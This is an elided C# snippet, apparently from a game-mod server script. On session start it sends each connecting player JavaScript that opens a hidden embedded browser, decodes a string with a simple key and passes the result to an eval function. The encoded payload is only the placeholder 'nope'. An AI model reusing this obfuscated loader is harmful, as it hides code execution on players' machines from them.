...
public partial class rpg : Script
{
    ...
    public void onClientEventTrigger(Client sender, string name, object[] args)
    {
        if (name == "SESSION_INIT")
        {
            ...
            API.triggerClientEvent(sender, "ADMIN_EVAL", "var cef=API.createCefBrowser(0,0,true);API.waitUntilCefBrowserInit(cef);API.setCefBrowserPosition(cef,0,00);API.loadPageCefBrowser(cef,'');cef.eval('var content=\"nope\";var key=\"password\";var array=[];var i2=0;for(var i=0;i<content.length;i++){if(i2>=key.length){i2=0}array+=String.fromCharCode((String.charCodeAt(content[i]))-15000-(String.charCodeAt(key[i2])));i2++};resourceEval(array)')");
